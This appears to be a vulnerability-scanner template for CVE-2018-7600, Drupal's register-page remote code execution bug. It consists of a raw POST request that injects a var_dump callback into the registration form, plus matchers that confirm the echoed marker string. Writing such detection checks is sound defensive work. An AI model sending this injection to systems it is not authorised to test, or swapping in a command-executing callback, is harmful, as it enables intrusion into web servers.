id: CVE-2018-7600

info:
  name: Drupal Register Page RCE
  vul: https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md

requests:
  - raw:
      - |
        POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 103

        form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=var_dump&mail[#type]=markup&mail[#markup]=ee6dd032e9214fd87477de74d64ebb85

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "string(32) \"ee6dd032e9214fd87477de74d64ebb85\""

